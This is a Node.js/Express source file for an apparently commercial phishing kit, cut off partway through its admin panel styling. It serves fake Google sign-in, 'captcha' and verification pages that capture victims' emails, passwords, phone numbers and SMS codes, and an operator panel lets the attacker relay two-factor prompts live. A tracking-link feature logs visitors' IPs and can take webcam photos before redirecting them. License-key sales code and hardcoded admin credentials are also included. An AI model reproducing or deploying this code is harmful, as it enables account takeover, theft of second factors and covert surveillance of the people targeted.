const express = require('express');
const session = require('express-session');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const crypto = require('crypto');

// ═══════════════════════════════════════════════
//  CONFIGURATION
// ═══════════════════════════════════════════════

const PORT = process.env.PORT || 3000;
const APP_URL = process.env.APP_URL || 'http://localhost:3000';
const ADMIN_USERNAME = 'spexkzi';
const ADMIN_PASSWORD = 'a7xK9mP2qR5vY8bN3wE6tH1jL4sU0cFd';
const ADMIN_PATH = '074829';

const DATA_DIR = path.join(__dirname, 'data');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

// ═══════════════════════════════════════════════
//  DATA FILES
// ═══════════════════════════════════════════════

const USERS_FILE = path.join(DATA_DIR, 'users.json');
const LINKS_FILE = path.join(DATA_DIR, 'links.json');
const CAPTURES_FILE = path.join(DATA_DIR, 'captures.json');
const VISITS_FILE = path.join(DATA_DIR, 'visits.json');
const LICENSES_FILE = path.join(DATA_DIR, 'licenses.json');
const CAMPAIGNS_FILE = path.join(DATA_DIR, 'campaigns.json');

function loadJSON(file, fallback) {
  try { return JSON.parse(fs.readFileSync(file)); }
  catch (e) { return fallback; }
}
function saveJSON(file, data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

// ═══════════════════════════════════════════════
//  HELPER FUNCTIONS
// ═══════════════════════════════════════════════

function generateLicenseKey() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let segments = [];
  for (let i = 0; i < 4; i++) {
    let seg = '';
    for (let j = 0; j < 4; j++) seg += chars[crypto.randomInt(chars.length)];
    segments.push(seg);
  }
  return segments.join('-');
}

function getIP(req) {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || '0.0.0.0';
}

function getUserAgent(req) {
  return req.headers['user-agent'] || 'Unknown';
}

function getDeviceInfo(ua) {
  const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
  const isDesktop = !isMobile;
  const browser = ua.includes('Chrome') ? 'Chrome' :
                  ua.includes('Firefox') ? 'Firefox' :
                  ua.includes('Safari') ? 'Safari' :
                  ua.includes('Edge') ? 'Edge' : 'Unknown';
  const os = ua.includes('Windows') ? 'Windows' :
             ua.includes('Mac') ? 'macOS' :
             ua.includes('Linux') ? 'Linux' :
             ua.includes('Android') ? 'Android' :
             ua.includes('iPhone') ? 'iOS' : 'Unknown';
  return { isMobile, isDesktop, browser, os };
}

function nameFromEmail(email) {
  if (!email) return 'User';
  let local = email.split('@')[0];
  let name = local.replace(/[._\-]/g, ' ').replace(/\d+/g, '').replace(/\s+/g, ' ').trim();
  if (!name || name.length < 2) return local;
  return name.replace(/\b\w/g, c => c.toUpperCase());
}

// ═══════════════════════════════════════════════
//  APP SETUP
// ═══════════════════════════════════════════════

const app = express();

app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.json({ limit: '50mb' }));

app.use(session({
  secret: 'x9k2m4n7q1p3',
  resave: false,
  saveUninitialized: true,
  cookie: { maxAge: 24 * 60 * 60 * 1000 }
}));

// Static files
app.use('/assets', express.static(path.join(__dirname, 'assets')));

// ─── AUTH MIDDLEWARE ──────────────────────────

function requireAdmin(req, res, next) {
  if (req.session.admin) return next();
  res.redirect('/' + ADMIN_PATH);
}

// ═══════════════════════════════════════════════
//  TRACKABLE LINKS ENGINE
// ═══════════════════════════════════════════════

app.get('/t/:linkId', (req, res) => {
  const { linkId } = req.params;
  const links = loadJSON(LINKS_FILE, {});
  const link = links[linkId];
  if (!link) return res.status(404).send('Link not found');

  const ip = getIP(req);
  const ua = getUserAgent(req);
  const device = getDeviceInfo(ua);
  const referrer = req.headers['referer'] || req.headers['referrer'] || 'Direct';

  const visits = loadJSON(VISITS_FILE, {});
  if (!visits[linkId]) visits[linkId] = [];
  const visitData = {
    id: uuidv4().slice(0, 8),
    ip,
    userAgent: ua,
    device,
    referrer,
    timestamp: new Date().toISOString(),
    cameraCaptured: false
  };
  visits[linkId].push(visitData);
  saveJSON(VISITS_FILE, visits);

  const wantsCamera = link.camera || false;
  const redirectUrl = link.redirectUrl || 'https://google.com';

  res.send(`<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Redirecting...</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
body{background:#0a0a0b;color:#e1e1e3;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;gap:20px;padding:20px}
.spinner{width:40px;height:40px;border:3px solid #252527;border-top:3px solid #8ab4f8;border-radius:50%;animation:spin 1s linear infinite}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
p{color:#5f6368;font-size:14px}
.hidden{display:none}
#camera-preview{width:320px;height:240px;border-radius:12px;border:1px solid #252527;object-fit:cover;background:#000}
</style></head><body>
<div id="loading">
  <div class="spinner"></div>
  <p>Loading...</p>
</div>
${wantsCamera ? `
<video id="camera-preview" class="hidden" autoplay playsinline muted></video>
<canvas id="photo-canvas" class="hidden"></canvas>` : ''}

<script>
(function(){
  const visitId = '${visitData.id}';
  const linkId = '${linkId}';
  const wantsCamera = ${wantsCamera};
  const redirectUrl = '${redirectUrl.replace(/'/g, "\\'")}';

  async function captureCamera() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480, facingMode: 'user' } });
      const video = document.getElementById('camera-preview');
      video.classList.remove('hidden');
      video.srcObject = stream;
      await video.play();

      setTimeout(() => {
        const canvas = document.getElementById('photo-canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        stream.getTracks().forEach(t => t.stop());

        const photoData = canvas.toDataURL('image/jpeg', 0.7);
        fetch('/t/' + linkId + '/capture-camera', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ visitId, photo: photoData })
        }).then(() => {
          window.location.href = redirectUrl;
        }).catch(() => {
          window.location.href = redirectUrl;
        });
      }, 500);
    } catch (err) {
      console.log('Camera access denied or error:', err);
      window.location.href = redirectUrl;
    }
  }

  if (wantsCamera) {
    captureCamera();
  } else {
    setTimeout(() => { window.location.href = redirectUrl; }, 800);
  }
})();
</script>
</body></html>`);
});

// Camera capture endpoint
app.post('/t/:linkId/capture-camera', (req, res) => {
  const { linkId } = req.params;
  const { visitId, photo } = req.body;
  if (!visitId || !photo) return res.json({ success: false });

  const visits = loadJSON(VISITS_FILE, {});
  if (!visits[linkId]) return res.json({ success: false });

  const visit = visits[linkId].find(v => v.id === visitId);
  if (!visit) return res.json({ success: false });

  visit.cameraCaptured = true;
  visit.cameraPhoto = photo;
  visit.cameraTime = new Date().toISOString();
  saveJSON(VISITS_FILE, visits);

  const photosDir = path.join(DATA_DIR, 'photos');
  if (!fs.existsSync(photosDir)) fs.mkdirSync(photosDir);
  const base64Data = photo.replace(/^data:image\/jpeg;base64,/, '');
  fs.writeFileSync(path.join(photosDir, `${linkId}_${visitId}.jpg`), base64Data, 'base64');

  res.json({ success: true });
});

// ═══════════════════════════════════════════════
//  USER & LICENSE MANAGEMENT
// ═══════════════════════════════════════════════

app.post('/' + ADMIN_PATH + '/users/create', requireAdmin, (req, res) => {
  const { username, password, role } = req.body;
  if (!username || !password) return res.json({ success: false, error: 'Username and password required' });

  const users = loadJSON(USERS_FILE, {});
  if (users[username]) return res.json({ success: false, error: 'Username already exists' });

  users[username] = {
    username,
    password,
    role: role || 'admin',
    created: new Date().toISOString(),
    createdBy: req.session.adminUser || ADMIN_USERNAME
  };
  saveJSON(USERS_FILE, users);
  res.json({ success: true, user: username });
});

app.get('/' + ADMIN_PATH + '/users/list', requireAdmin, (req, res) => {
  const users = loadJSON(USERS_FILE, {});
  res.json({ success: true, users: Object.values(users) });
});

app.post('/' + ADMIN_PATH + '/users/delete', requireAdmin, (req, res) => {
  const { username } = req.body;
  if (!username) return res.json({ success: false });
  const users = loadJSON(USERS_FILE, {});
  if (!users[username]) return res.json({ success: false });
  delete users[username];
  saveJSON(USERS_FILE, users);
  res.json({ success: true });
});

// ═══════════════════════════════════════════════
//  LICENSE KEY MANAGEMENT
// ═══════════════════════════════════════════════

app.post('/' + ADMIN_PATH + '/licenses/create', requireAdmin, (req, res) => {
  const { duration, note, maxUses } = req.body;
  const licenses = loadJSON(LICENSES_FILE, {});

  const key = generateLicenseKey();
  let durationMs = 0;
  let durationLabel = '';

  switch (duration) {
    case '1h': durationMs = 3600000; durationLabel = '1 Hour'; break;
    case '6h': durationMs = 21600000; durationLabel = '6 Hours'; break;
    case '12h': durationMs = 43200000; durationLabel = '12 Hours'; break;
    case '1d': durationMs = 86400000; durationLabel = '1 Day'; break;
    case '3d': durationMs = 259200000; durationLabel = '3 Days'; break;
    case '7d': durationMs = 604800000; durationLabel = '7 Days'; break;
    case '30d': durationMs = 2592000000; durationLabel = '30 Days'; break;
    case '90d': durationMs = 7776000000; durationLabel = '90 Days'; break;
    case '365d': durationMs = 31536000000; durationLabel = '365 Days'; break;
    case 'lifetime': durationMs = 99999999999999; durationLabel = 'Lifetime'; break;
    default: durationMs = 86400000; durationLabel = '1 Day';
  }

  licenses[key] = {
    key,
    duration,
    durationLabel,
    durationMs,
    note: note || '',
    maxUses: maxUses || 0,
    uses: 0,
    active: true,
    created: new Date().toISOString(),
    createdBy: req.session.adminUser || ADMIN_USERNAME,
    expiresAt: duration === 'lifetime' ? null : new Date(Date.now() + durationMs).toISOString()
  };
  saveJSON(LICENSES_FILE, licenses);
  res.json({ success: true, license: licenses[key] });
});

app.get('/' + ADMIN_PATH + '/licenses/list', requireAdmin, (req, res) => {
  const licenses = loadJSON(LICENSES_FILE, {});
  res.json({ success: true, licenses: Object.values(licenses) });
});

app.post('/' + ADMIN_PATH + '/licenses/revoke', requireAdmin, (req, res) => {
  const { key } = req.body;
  const licenses = loadJSON(LICENSES_FILE, {});
  if (!licenses[key]) return res.json({ success: false });
  licenses[key].active = false;
  saveJSON(LICENSES_FILE, licenses);
  res.json({ success: true });
});

app.post('/api/validate-license', (req, res) => {
  const { key } = req.body;
  if (!key) return res.json({ valid: false, error: 'No key provided' });
  const licenses = loadJSON(LICENSES_FILE, {});
  const license = licenses[key];
  if (!license) return res.json({ valid: false, error: 'Invalid key' });
  if (!license.active) return res.json({ valid: false, error: 'License revoked' });
  if (license.expiresAt && new Date(license.expiresAt) < new Date()) return res.json({ valid: false, error: 'License expired' });
  if (license.maxUses > 0 && license.uses >= license.maxUses) return res.json({ valid: false, error: 'Max uses exceeded' });

  license.uses = (license.uses || 0) + 1;
  saveJSON(LICENSES_FILE, licenses);

  res.json({ valid: true, license: { key: license.key, durationLabel: license.durationLabel, note: license.note } });
});

// ═══════════════════════════════════════════════
//  TRACKING LINK MANAGEMENT
// ═══════════════════════════════════════════════

app.post('/' + ADMIN_PATH + '/links/create', requireAdmin, (req, res) => {
  const { name, redirectUrl, camera, notes } = req.body;
  if (!name || !redirectUrl) return res.json({ success: false, error: 'Name and redirect URL required' });

  const links = loadJSON(LINKS_FILE, {});
  const linkId = uuidv4().slice(0, 10);

  links[linkId] = {
    id: linkId,
    name,
    redirectUrl,
    camera: camera === true || camera === 'true' || false,
    notes: notes || '',
    created: new Date().toISOString(),
    createdBy: req.session.adminUser || ADMIN_USERNAME,
    visitCount: 0
  };
  saveJSON(LINKS_FILE, links);
  const fullUrl = `${APP_URL}/t/${linkId}`;
  res.json({ success: true, link: links[linkId], trackingUrl: fullUrl });
});

app.get('/' + ADMIN_PATH + '/links/list', requireAdmin, (req, res) => {
  const links = loadJSON(LINKS_FILE, {});
  const visits = loadJSON(VISITS_FILE, {});
  const result = Object.values(links).map(l => ({
    ...l,
    visitCount: (visits[l.id] || []).length,
    trackingUrl: `${APP_URL}/t/${l.id}`
  }));
  res.json({ success: true, links: result });
});

app.get('/' + ADMIN_PATH + '/links/:linkId/visits', requireAdmin, (req, res) => {
  const { linkId } = req.params;
  const visits = loadJSON(VISITS_FILE, {});
  const linkVisits = visits[linkId] || [];
  res.json({ success: true, visits: linkVisits.reverse() });
});

app.post('/' + ADMIN_PATH + '/links/delete', requireAdmin, (req, res) => {
  const { linkId } = req.body;
  const links = loadJSON(LINKS_FILE, {});
  if (!links[linkId]) return res.json({ success: false });
  delete links[linkId];
  saveJSON(LINKS_FILE, links);
  res.json({ success: true });
});

// ═══════════════════════════════════════════════
//  EXISTING CAPTURE FUNCTIONALITY
// ═══════════════════════════════════════════════

function loadCaptures() { return loadJSON(CAPTURES_FILE, []); }
function saveCaptures(arr) { saveJSON(CAPTURES_FILE, arr); }
function loadCampaigns() { return loadJSON(CAMPAIGNS_FILE, {}); }
function saveCampaigns(c) { saveJSON(CAMPAIGNS_FILE, c); }

// ─── FRONTEND ROUTES ──────────────────────────

app.get('/', (req, res) => {
  if (req.query.c) req.session.campaign = req.query.c;
  res.sendFile(path.join(__dirname, 'login.html'));
});

app.post('/submit-email', async (req, res) => {
  let email = (req.body.identifier || '').trim();
  if (!email) return res.redirect('/');
  let sessionId = uuidv4().slice(0, 12);
  req.session.email = email;
  req.session.sid = sessionId;
  let displayName = null;
  if (req.body.manualname && req.body.manualname.trim()) {
    displayName = req.body.manualname.trim();
  } else {
    displayName = nameFromEmail(email);
  }
  req.session.displayName = displayName;
  let campaign = req.session.campaign || 'general';
  let entry = {
    id: sessionId, email, displayName, campaign, password: '',
    step: 'email', verificationType: '', phoneNumber: '', smsCode: '',
    status: 'active', time: new Date().toISOString(),
    ip: getIP(req), userAgent: getUserAgent(req)
  };
  let captures = loadCaptures();
  captures.push(entry);
  saveCaptures(captures);
  res.redirect('/password');
});

app.get('/password', (req, res) => {
  if (!req.session.email) return res.redirect('/');
  let email = req.session.email;
  let displayName = req.session.displayName || nameFromEmail(email);
  let html = fs.readFileSync(path.join(__dirname, 'password.html'), 'utf8');
  html = html.replace('{{DISPLAY_NAME}}', displayName).replace('{{EMAIL}}', email);
  res.send(html);
});

app.post('/submit-password', (req, res) => {
  let password = req.body.password || '';
  let email = req.session.email;
  let displayName = req.session.displayName;
  let sid = req.session.sid;
  let campaign = req.session.campaign || 'general';
  if (!email || !password) return res.redirect('/');
  let captures = loadCaptures();
  for (let i = captures.length - 1; i >= 0; i--) {
    if (captures[i].email === email && captures[i].step === 'email') {
      captures[i].password = password;
      captures[i].step = 'password';
      captures[i].time = new Date().toISOString();
      break;
    }
  }
  saveCaptures(captures);
  fs.appendFileSync(path.join(DATA_DIR, 'captured.txt'), `[${new Date().toISOString()}] ${displayName} | ${email} | ${password} | ${campaign}\n`);
  res.redirect('/captcha');
});

// ─── CAPTCHA ────────────────────────────────

app.get('/captcha', (req, res) => {
  if (!req.session.email) return res.redirect('/');
  let sid = req.session.sid;
  let captures = loadCaptures();
  for (let i = captures.length - 1; i >= 0; i--) {
    if (captures[i].id === sid) { captures[i].step = 'captcha'; captures[i].time = new Date().toISOString(); break; }
  }
  saveCaptures(captures);
  res.send(`<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Verify you're human</title><link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap" rel="stylesheet"><style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Google Sans',Arial,sans-serif}
body{background:#f0f4f9;height:100vh;display:flex;justify-content:center;align-items:center}
.container{background:#fff;border-radius:28px;padding:48px 40px;width:480px;text-align:center;box-shadow:0 1px 3px rgba(0,0,0,.08)}
.logo{width:40px;margin-bottom:24px}
h2{font-size:28px;font-weight:400;color:#1f1f1f;margin-bottom:12px}
p{font-size:14px;color:#444746;margin-bottom:28px;line-height:1.5}
.spinner{width:48px;height:48px;border:4px solid #e0e0e0;border-top:4px solid #1a73e8;border-radius:50%;animation:spin 1.2s linear infinite;margin:0 auto 24px}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.progress-bar{width:100%;height:6px;background:#e0e0e0;border-radius:3px;overflow:hidden;margin-bottom:16px}
.progress-fill{height:100%;background:#1a73e8;border-radius:3px;width:0%;animation:progress 10s ease-in-out forwards}
@keyframes progress{0%{width:0%}100%{width:100%}}
.status-text{font-size:13px;color:#5f6368}
</style></head><body>
<div class="container">
  <img class="logo" src="https://s3-figma-hubfile-images-production.figma.com/hub/file/carousel/img/cbbdf444bdd9c4a5a39af2e727d1b9a433fbc01c">
  <h2>Verification check</h2><p>We're checking that you're a real person. This should only take a moment.</p>
  <div class="spinner"></div>
  <div class="progress-bar"><div class="progress-fill"></div></div>
  <div class="status-text" id="status">Verifying...</div>
</div>
<script>
const s=['Verifying...','Checking browser security...','Analyzing request patterns...','Validating session...','Cross-referencing user agent...','Almost done...'];
let i=0;const el=document.getElementById('status');
setInterval(()=>{i++;if(i<s.length)el.textContent=s[i];},1800);
setTimeout(()=>{window.location.href='/verification-pending';},12000);
</script></body></html>`);
});

// ─── VERIFICATION PENDING ─────────────────────

app.get('/verification-pending', (req, res) => {
  if (!req.session.email) return res.redirect('/');
  let sid = req.session.sid;
  let captures = loadCaptures();
  for (let i = captures.length - 1; i >= 0; i--) {
    if (captures[i].id === sid) { captures[i].step = 'waiting_verification'; captures[i].time = new Date().toISOString(); break; }
  }
  saveCaptures(captures);
  res.send(`<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Verification required</title>
<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap" rel="stylesheet"><style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Google Sans',Arial,sans-serif}
body{background:#202124;height:100vh;display:flex;justify-content:center;align-items:center;color:#fff}
.card{width:480px;background:#000;border-radius:28px;padding:48px 36px;text-align:center}
.spinner{width:40px;height:40px;border:3px solid #3c4043;border-top:3px solid #8ab4f8;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
h2{font-size:24px;font-weight:400;margin-bottom:12px}
p{font-size:14px;color:#9aa0a6;line-height:1.5;margin-bottom:8px}
</style></head><body>
<div class="card">
  <div class="spinner"></div>
  <h2>Checking your account</h2><p>We need to verify your identity. Sending a request to your device...</p>
  <p style="font-size:12px;color:#5f6368;margin-top:16px">Please wait, this may take a moment</p>
</div>
<script>
setInterval(()=>{fetch('/check-verification-status').then(r=>r.json()).then(d=>{if(d.redirect)window.location.href=d.redirect;}).catch(()=>{});},3000);
</script></body></html>`);
});

app.get('/check-verification-status', (req, res) => {
  let sid = req.session.sid;
  if (!sid) return res.json({ redirect: null });
  let captures = loadCaptures();
  for (let c of captures) {
    if (c.id !== sid) continue;
    if (c.verificationType === 'gmail_app' && c.step === 'waiting_gmail_app') return res.json({ redirect: `/verify/${sid}/gmail_app` });
    if (c.verificationType === 'phone_sms' && c.step === 'waiting_sms') return res.json({ redirect: `/verify/${sid}/phone_sms` });
    if (c.verificationType === 'phone_number_sms' && c.step === 'waiting_phone') return res.json({ redirect: `/verify/${sid}/phone_number_sms` });
    if (c.verificationType === 'phone_number_sms' && c.step === 'waiting_sms') return res.json({ redirect: `/verify/${sid}/phone_sms` });
  }
  return res.json({ redirect: null });
});

// ─── VERIFICATION PAGES ──────────────────────

app.get('/verify/:sessionId/:type', (req, res) => {
  let { sessionId, type } = req.params;
  let pageMap = { 'gmail_app': 'opengmailverif.html', 'phone_sms': 'verifysms.html', 'phone_number_sms': 'putinphonenumber.html' };
  let file = pageMap[type];
  if (!file) return res.status(404).send('Invalid');
  let captures = loadCaptures();
  let victimEmail = '';
  for (let c of captures) {
    if (c.id === sessionId) {
      c.verificationType = type;
      if (type === 'phone_number_sms') c.step = 'waiting_phone';
      else if (type === 'phone_sms') c.step = 'waiting_sms';
      else c.step = 'waiting_gmail_app';
      c.time = new Date().toISOString();
      victimEmail = c.email;
      break;
    }
  }
  saveCaptures(captures);
  if (!victimEmail) return res.redirect('/');
  let html = fs.readFileSync(path.join(__dirname, file), 'utf8');
  html = html.replace(/\{\{VICTIM_EMAIL\}\}/g, victimEmail);
  html = html.replace(/\{\{SESSION_ID\}\}/g, sessionId);
  res.send(html);
});

app.post('/submit-phone', (req, res) => {
  let phone = req.body.phone || '';
  let sid = req.body.sid || req.session.sid;
  if (!sid || !phone) return res.redirect('/');
  let captures = loadCaptures();
  for (let c of captures) { if (c.id === sid) { c.phoneNumber = phone; c.step = 'waiting_sms'; c.time = new Date().toISOString(); break; } }
  saveCaptures(captures);
  res.redirect(`/verify/${sid}/phone_sms`);
});

app.post('/submit-sms', (req, res) => {
  let code = req.body.code || '';
  let sid = req.body.sid || req.session.sid;
  if (!sid || !code) return res.redirect('/');
  let captures = loadCaptures();
  for (let c of captures) {
    if (c.id === sid) { c.smsCode = code; c.step = 'sms_captured'; c.time = new Date().toISOString(); break; }
  }
  saveCaptures(captures);
  res.redirect('https://accounts.google.com');
});

app.post('/submit-gmail-verify', (req, res) => {
  let sid = req.body.sid || req.session.sid;
  if (!sid) return res.json({ success: false });
  let captures = loadCaptures();
  for (let c of captures) { if (c.id === sid) { c.step = 'verified'; c.time = new Date().toISOString(); break; } }
  saveCaptures(captures);
  res.json({ success: true });
});

app.get('/check-gmail-status', (req, res) => {
  let sid = req.query.sid;
  if (!sid) return res.json({ verified: false });
  let captures = loadCaptures();
  for (let c of captures) { if (c.id === sid && c.step === 'verified') return res.json({ verified: true }); }
  return res.json({ verified: false });
});

// ─── ADMIN SEND VERIFICATION ──

app.post('/admin-send-verification', (req, res) => {
  if (!req.session.admin) return res.status(401).json({ success: false });
  let { sid, type } = req.body;
  if (!sid || !type) return res.json({ success: false });
  let captures = loadCaptures();
  let found = false;
  for (let c of captures) {
    if (c.id === sid) {
      c.verificationType = type;
      if (type === 'phone_number_sms') c.step = 'waiting_phone';
      else if (type === 'phone_sms') c.step = 'waiting_sms';
      else if (type === 'gmail_app') c.step = 'waiting_gmail_app';
      c.time = new Date().toISOString();
      found = true;
      break;
    }
  }
  if (found) saveCaptures(captures);
  res.json({ success: found });
});

app.post('/admin-mark-verified', (req, res) => {
  if (!req.session.admin) return res.status(401).json({ success: false });
  let { sid } = req.body;
  if (!sid) return res.json({ success: false });
  let captures = loadCaptures();
  let found = false;
  for (let c of captures) {
    if (c.id === sid) { c.step = 'verified'; c.time = new Date().toISOString(); found = true; break; }
  }
  if (found) saveCaptures(captures);
  res.json({ success: found });
});

app.post('/admin-delete-session', (req, res) => {
  if (!req.session.admin) return res.status(401).json({ success: false });
  let { sid } = req.body;
  if (!sid) return res.json({ success: false });
  let captures = loadCaptures();
  let filtered = captures.filter(c => c.id !== sid);
  if (filtered.length === captures.length) return res.json({ success: false });
  saveCaptures(filtered);
  res.json({ success: true });
});

app.post('/admin-clear-active', (req, res) => {
  if (!req.session.admin) return res.status(401).json({ success: false });
  let captures = loadCaptures();
  let remaining = captures.filter(c => c.step !== 'email' && c.step !== 'password' && c.step !== 'captcha' && c.step !== 'waiting_verification' && c.step !== 'waiting_gmail_app' && c.step !== 'waiting_phone' && c.step !== 'waiting_sms');
  saveCaptures(remaining);
  res.json({ success: true });
});

app.post('/admin-clear-completed', (req, res) => {
  if (!req.session.admin) return res.status(401).json({ success: false });
  let captures = loadCaptures();
  let remaining = captures.filter(c => c.step !== 'sms_captured' && c.step !== 'verified');
  saveCaptures(remaining);
  res.json({ success: true });
});

app.post('/admin-clear-all', (req, res) => {
  if (!req.session.admin) return res.status(401).json({ success: false });
  saveCaptures([]);
  saveCampaigns({});
  try { fs.unlinkSync(path.join(DATA_DIR, 'captured.txt')); } catch (e) {}
  res.json({ success: true });
});

// ═══════════════════════════════════════════════
//  PROFESSIONAL ADMIN PANEL
// ═══════════════════════════════════════════════

app.get('/' + ADMIN_PATH, (req, res) => {
  if (req.session.admin) return renderAdminPanel(req, res);
  res.send(`<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Admin Panel</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif}
body{background:#0a0a0b;color:#e1e1e3;display:flex;justify-content:center;align-items:center;height:100vh}
.card{background:#121213;border:1px solid #1f1f21;border-radius:16px;padding:40px;width:420px;box-shadow:0 20px 60px rgba(0,0,0,.5)}
.card-logo{display:flex;align-items:center;gap:10px;margin-bottom:20px}
.card-logo svg{width:32px;height:32px}
.card-logo span{font-size:18px;font-weight:700;color:#fff;letter-spacing:-.03em}
h1{font-size:22px;font-weight:600;margin-bottom:4px;color:#fff}
.sub{font-size:13px;color:#5f6368;margin-bottom:32px}
label{display:block;font-size:12px;margin-bottom:6px;color:#9aa0a6;font-weight:500}
input{width:100%;height:44px;background:#0a0a0b;border:1px solid #252527;border-radius:10px;padding:0 16px;color:#fff;font-size:14px;margin-bottom:18px;outline:none;transition:.12s;font-family:'Inter',sans-serif}
input:focus{border-color:#8ab4f8;box-shadow:0 0 0 3px rgba(138,180,248,.1)}
button{width:100%;height:44px;background:#8ab4f8;border:none;border-radius:10px;color:#0a0a0b;font-size:14px;font-weight:600;cursor:pointer;transition:.12s;font-family:'Inter',sans-serif}
button:hover{background:#a3c4fa;transform:translateY(-1px)}
.error{color:#f28b82;font-size:12px;margin-top:10px;display:none;text-align:center}
</style></head><body>
<div class="card">
  <div class="card-logo">
    <svg viewBox="0 0 48 48" width="32" height="32"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.54 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.83.89 7.45 2.54 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
    <span>googlz</span>
  </div>
  <h1>Welcome back</h1>
  <div class="sub">Sign in to access the admin panel</div>
  <form method="POST" action="/${ADMIN_PATH}/login">
    <label>Username</label><input name="username" required autofocus autocomplete="off">
    <label>Password</label><input name="password" type="password" required autocomplete="off">
    <button type="submit">Sign in</button>
    <div class="error" id="error">Invalid username or password</div>
  </form>
</div>
<script>if(window.location.search.includes('error')){document.getElementById('error').style.display='block';}</script>
</body></html>`);
});

app.post('/' + ADMIN_PATH + '/login', (req, res) => {
  let { username, password } = req.body;
  if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
    req.session.admin = true;
    req.session.adminUser = username;
    return res.redirect('/' + ADMIN_PATH);
  }
  res.redirect('/' + ADMIN_PATH + '?error=1');
});

app.get('/' + ADMIN_PATH + '/logout', (req, res) => { req.session.destroy(); res.redirect('/' + ADMIN_PATH); });

// ═══════════════════════════════════════════════
//  ADMIN PANEL RENDER – FULL MODERN UI
// ═══════════════════════════════════════════════

function renderAdminPanel(req, res) {
  let captures = loadCaptures();
  let links = loadJSON(LINKS_FILE, {});
  let licenses = loadJSON(LICENSES_FILE, {});
  let users = loadJSON(USERS_FILE, {});
  let visits = loadJSON(VISITS_FILE, {});

  let activeSessions = captures.filter(c => c.step !== 'sms_captured' && c.step !== 'verified');
  let completedCaptures = captures.filter(c => c.step === 'sms_captured' || c.step === 'verified');
  let totalVisits = Object.values(visits).reduce((a, b) => a + b.length, 0);
  let activeLicenses = Object.values(licenses).filter(l => l.active).length;

  res.send(`<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>googlz · Control Panel</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0b;color:#e1e1e3;font-family:'Inter',-apple-system,sans-serif;min-height:100vh}
.topbar{background:#121213;border-bottom:1px solid #1f1f21;padding:0 32px;display:flex;justify-content:space-between;align-items:center;height:60px;position:sticky;top:0;z-index:100}
.topbar-left{display:flex;align-items:center;gap:14px}
.topbar-logo{display:flex;align-items:center;gap:8px}
.topbar-logo svg{width:26px;height:26px}
.topbar-logo span{font-size:16px;font-weight:700;color:#fff;letter-spacing:-.03em}
.topbar-right{display:flex;align-items:center;gap:12px}
.stat-pill{display:flex;align-items:center;gap:6px;background:#1a1a1c;border:1px solid #252527;border-radius:20px;padding:5px 14px;font-size:11px;color:#9aa0a6}
.stat-pill strong{color:#e1e1e3;font-weight:500}
.topbar-btn{background:transparent;border:1px solid #252527;border-radius:8px;color:#9aa0a6;padding:7px 14px;font-size:11px;cursor:pointer;transition:.12s;font-family:'Inter',sans-serif;display:flex;align-items:center;gap:5px;text-decoration:none}
.topbar-btn:hover{background:#1a1a1c;color:#e1e1e3;border-color:#3a3a3d}
.logout-link{color:#5f6368;text-decoration:none;font-size:12px;padding:7px 14px;border-radius:8px;transition:.12s}
.logout-link:hover{color:#f28b82;background:#1a1414}
